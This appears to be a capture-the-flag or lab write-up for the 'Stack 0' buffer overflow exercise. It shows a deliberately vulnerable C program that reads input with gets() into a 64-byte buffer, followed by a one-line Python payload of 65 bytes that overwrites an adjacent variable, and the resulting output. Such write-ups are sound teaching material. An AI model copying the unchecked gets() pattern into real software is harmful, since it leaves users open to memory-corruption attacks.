# STACK 0

## SOURCE CODE

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
  volatile int modified; 			// overwrite
  char buffer[64];

  modified = 0;
  gets(buffer); 					// vuln is here

  if(modified != 0) {
      printf("you have changed the 'modified' variable\n");
  } else {
      printf("Try again?\n");
  }
}
```

## IDEA

- Give an input has 64 bytes to overwrite the buffer varibale and write 1 byte to modifide the "modified" variable => we will overwrite 65 bytes

## EXPLOIT

- Payload

```
python -c 'print("a"*65)' | ./stack0
```

## RESULT

```
$ python -c 'print("a"*65)' | ./stack0
you have changed the 'modified' variable
```
